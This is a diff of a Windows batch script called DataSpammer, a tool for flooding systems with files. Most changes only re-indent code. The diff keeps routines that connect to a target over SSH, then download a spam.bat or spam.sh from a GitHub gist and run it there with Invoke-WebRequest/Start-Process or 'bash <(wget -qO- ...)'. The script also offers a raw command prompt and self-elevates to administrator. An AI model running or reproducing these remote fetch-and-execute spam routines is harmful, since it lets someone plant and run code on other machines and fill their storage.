@@ -9,66 +9,65 @@
 ::    Add BETA / STABLE Branch Switch
 
 
-
-@echo off
-chcp 65001
-powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'DataSpammer', 'Starting Dataspammer...', [System.Windows.Forms.ToolTipIcon]::None)}"
-set "current-script-version=v3.1"
-if "%1"=="h" goto help
-if "%1"=="-h" goto help
-if "%1"=="help" goto help
-if "%1"=="-help" goto help
-if "%1"=="--help" goto help
-if "%1"=="faststart" goto menu
-if "%1"=="update" goto fast.git.update
-if "%1"=="remove" goto sys.delete.script
-if "%1"=="" goto normal.start
-if "%1"=="api" goto sys.cli
+:!top
+    @echo off
+    chcp 65001
+    powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'DataSpammer', 'Started DataSpammer', [System.Windows.Forms.ToolTipIcon]::None)}"
+    set "current-script-version=v3.1"
+    if "%1"=="h" goto help
+    if "%1"=="-h" goto help
+    if "%1"=="help" goto help
+    if "%1"=="-help" goto help
+    if "%1"=="--help" goto help
+    if "%1"=="faststart" goto menu
+    if "%1"=="update" goto fast.git.update
+    if "%1"=="remove" goto sys.delete.script
+    if "%1"=="" goto normal.start
+    if "%1"=="api" goto sys.cli
 
 :normal.start
-@color 02
-@if not defined debug_assist (@ECHO OFF) else (@echo on)
-if not defined devtools (goto top-startup) else (goto dtd)
-setlocal enableextensions ENABLEDELAYEDEXPANSION 
-net session >nul 2>&1
-:: Fix Directory if started with Elevated Priviliges
-if %errorLevel% == 0 (cd /d %~dp0) else (goto top-startup)
+    @color 02
+    @if not defined debug_assist (@ECHO OFF) else (@echo on)
+    if not defined devtools (goto top-startup) else (goto dtd)
+    setlocal enableextensions ENABLEDELAYEDEXPANSION 
+    net session >nul 2>&1
+    :: Fix Directory if started with Elevated Priviliges
+    if %errorLevel% == 0 (cd /d %~dp0) else (goto top-startup)
 
 
 :top-startup
-
-set inputFile=settings.conf
-set "firstLine="
-set /p firstLine=<%inputFile%
-if "%firstLine%"=="small-install" (
-    set "small-install=1" && goto sys.enable.ascii.tweak
-) else (
-    goto check-files
-)
-
-
-cd /d %~dp0
-set "firstLine="
-for /f "usebackq tokens=*" %%A in ("settings.conf") do (
-    set "firstLine=%%A"
-    goto :sys.check.install
-)
-
-set inputFile=settings.conf
-set "firstLine="
-set /p firstLine=<%inputFile%
+    set inputFile=settings.conf
+    set "firstLine="
+    set /p firstLine=<%inputFile%
+    if "%firstLine%"=="small-install" (
+        set "small-install=1" && goto sys.enable.ascii.tweak
+    ) else (
+        goto check-files
+    )
+    
+    
+    cd /d %~dp0
+    set "firstLine="
+    for /f "usebackq tokens=*" %%A in ("settings.conf") do (
+        set "firstLine=%%A"
+        goto :sys.check.install
+    )
+    
+    set inputFile=settings.conf
+    set "firstLine="
+    set /p firstLine=<%inputFile%
 
 :sys.check.install
-if "%firstLine%"=="small-install" (
-    net session >nul 2>&1
-    if %errorLevel% neq 0 (
-        powershell -Command "Start-Process '%~f0' -Verb runAs"
-        exit /b
+    if "%firstLine%"=="small-install" (
+        net session >nul 2>&1
+        if %errorLevel% neq 0 (
+            powershell -Command "Start-Process '%~f0' -Verb runAs"
+            exit /b
+        )
+        goto check-files
+    ) else (
+        set "small-install=1" && goto sys.enable.ascii.tweak
     )
-    goto check-files
-) else (
-    set "small-install=1" && goto sys.enable.ascii.tweak
-)
 
 
 :check-files
@@ -169,12 +168,12 @@ if "%firstLine%"=="small-install" (
     
 
 :git.update.check
-if "%1"=="up" (
-    call :git.version.clean
-) else (
-    call :git.version.outdated
-)
-exit /b
+    if "%1"=="up" (
+        call :git.version.clean
+    ) else (
+        call :git.version.outdated
+    )
+    exit /b
 
 :git.version.outdated
     echo Version Outdated!
@@ -267,16 +266,16 @@ exit /b
     :: If the Script got opened from installer?
     if "%settingsmainscriptvar%" == "1" goto settings
 
-set inputFile=settings.conf
-set "lastLine="
-for /f "delims=" %%i in (%inputFile%) do (
-    set "lastLine=%%i"
-)
-if "%lastLine%"=="dev" (
-    set "dev-mode=1"
-) else (
-    set "dev-mode=0"
-)
+    set inputFile=settings.conf
+    set "lastLine="
+    for /f "delims=" %%i in (%inputFile%) do (
+        set "lastLine=%%i"
+    )
+    if "%lastLine%"=="dev" (
+        set "dev-mode=1"
+    ) else (
+        set "dev-mode=0"
+    )
 
 
 :sys.extract.settings.to.var
@@ -447,9 +446,9 @@ if "%lastLine%"=="dev" (
     goto credits
 
 :settings
-color
-if %dev-mode% == 1 set "settings-dev-display=Activated"
-if %dev-mode% == 0 set "settings-dev-display=Not Activated"
+    color
+    if %dev-mode% == 1 set "settings-dev-display=Activated"
+    if %dev-mode% == 0 set "settings-dev-display=Not Activated"
     :: TLI for Settings - Add Skip Security Question + Always use Custom Directory Yes/No
     cls 
     echo ========
@@ -548,28 +547,28 @@ if %dev-mode% == 0 set "settings-dev-display=Not Activated"
 
 
 :activate.dev.options
-if %dev-mode% == 1 echo Developer Mode is already activated!
-
-echo Do you want to activate the Developer Options?
-echo Developer Options include Debugging, Logging and some extra Menus
-echo This can lead to some instabilty!
-    choice /C YN /M "Yes/No"
-    set _erl=%errorlevel%
-    if %_erl%==Y goto write-dev-options
-    if %_erl%==N goto settings
-
+    if %dev-mode% == 1 echo Developer Mode is already activated!
+    
+    echo Do you want to activate the Developer Options?
+    echo Developer Options include Debugging, Logging and some extra Menus
+    echo This can lead to some instabilty!
+        choice /C YN /M "Yes/No"
+        set _erl=%errorlevel%
+        if %_erl%==Y goto write-dev-options
+        if %_erl%==N goto settings
+    
 :write-dev-options
-setlocal enabledelayedexpansion
-set inputFile=settings.conf
-set tempFile=tempfile.tmp
-(for /f "delims=" %%i in (%inputFile%) do (
-    echo %%i
-)) > %tempFile%
-echo dev >> %tempFile%
-move /y %tempFile% %inputFile%
-echo Developer Options have been activated!
-@ping -n 1 localhost> nul
-goto restart.script
+    setlocal enabledelayedexpansion
+    set inputFile=settings.conf
+    set tempFile=tempfile.tmp
+    (for /f "delims=" %%i in (%inputFile%) do (
+        echo %%i
+    )) > %tempFile%
+    echo dev >> %tempFile%
+    move /y %tempFile% %inputFile%
+    echo Developer Options have been activated!
+    @ping -n 1 localhost> nul
+    goto restart.script
 
 :settings.change.df.filename
     :: Write Standart Filename to File
@@ -930,16 +929,16 @@ goto restart.script
     if %linux-win-ssh% == 2 goto spam.ssh.target.lx
 
 :spam.ssh.target.win
-set ssh_command="Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.bat' -OutFile 'spam.bat'; Start-Process 'spam.bat' -ArgumentList %ssh-filecount%"
-ssh %ssh-name%@%ssh-ip% "powershell -Command %ssh_command%"
-echo Successfully executed SSH Connection.
-goto ssh.done
+    set ssh_command="Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.bat' -OutFile 'spam.bat'; Start-Process 'spam.bat' -ArgumentList %ssh-filecount%"
+    ssh %ssh-name%@%ssh-ip% "powershell -Command %ssh_command%"
+    echo Successfully executed SSH Connection.
+    goto ssh.done
 
 :spam.ssh.target.lx
-set ssh_command="bash <(wget -qO- https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.sh) %filecount%"
-ssh %ssh-name%@%ssh-ip% "%ssh_command%"
-echo Successfully executed SSH Connection.
-goto ssh.done
+    set ssh_command="bash <(wget -qO- https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.sh) %filecount%"
+    ssh %ssh-name%@%ssh-ip% "%ssh_command%"
+    echo Successfully executed SSH Connection.
+    goto ssh.done
 
 :ssh.done
     :: Remote Spam Done TLI
@@ -1293,7 +1292,7 @@ goto ssh.done
     If %menu9% == 2 goto menu
     goto done2
 
-:: Display Help Dialog
+    :: Display Help Dialog
 :help
     echo.
     echo.
@@ -1322,7 +1321,7 @@ goto ssh.done
 
     exit /b 1464
 
-:: Whitout the UD stuff
+    :: Whitout the UD stuff
 :fast.git.update
 
     set "owner=PIRANY1"
@@ -1421,37 +1420,37 @@ goto ssh.done
     exit 0
 
 :restart.script
-set "restart-main=1"
-install.bat
+    set "restart-main=1"
+    install.bat
 
 :sys.cli
-@echo off
-chcp 65001 >nul
-for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
-echo Type 'help' to get an overview of commands
-:sys.cli.input
-echo.
-echo  [97m???[0m([92m%username%[0m@[95m%computername%[0m)-[[91m%cd%[0m] - [[94m%time% %date%[0m]
-set /p cmd=".%BS% [97m???>[0m "
-echo.
-%cmd%
-goto sys.cli.input
+    @echo off
+    chcp 65001 >nul
+    for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
+    echo Type 'help' to get an overview of commands
+    :sys.cli.input
+    echo.
+    echo  [97m???[0m([92m%username%[0m@[95m%computername%[0m)-[[91m%cd%[0m] - [[94m%time% %date%[0m]
+    set /p cmd=".%BS% [97m???>[0m "
+    echo.
+    %cmd%
+    goto sys.cli.input
 
 :sys.verify.execution
-set "verify=%random%"
-powershell -Command "& {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox('Please enter Code %verify% to confirm that you want to execute this Option', 'DataSpammer Verify')}" > %TEMP%\out.tmp
-set /p OUT=<%TEMP%\out.tmp
-if %verify%==%OUT% (goto success) else (goto failed)
+    set "verify=%random%"
+    powershell -Command "& {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox('Please enter Code %verify% to confirm that you want to execute this Option', 'DataSpammer Verify')}" > %TEMP%\out.tmp
+    set /p OUT=<%TEMP%\out.tmp
+    if %verify%==%OUT% (goto success) else (goto failed)
 
 :success
-set msgBoxArgs="& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Sucess', 'DataSpammer Verify');}"
-powershell -Command %msgBoxArgs%
-exit /b
+    set msgBoxArgs="& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Sucess', 'DataSpammer Verify');}"
+    powershell -Command %msgBoxArgs%
+    exit /b
 
 :failed
-set msgBoxArgs="& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('You have entered the wrong Code. Please try again', 'DataSpammer Verify');}"
-powershell -Command %msgBoxArgs%
-goto sys.verify.execution
+    set msgBoxArgs="& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('You have entered the wrong Code. Please try again', 'DataSpammer Verify');}"
+    powershell -Command %msgBoxArgs%
+    goto sys.verify.execution
 
 :cancel 
     :: yes
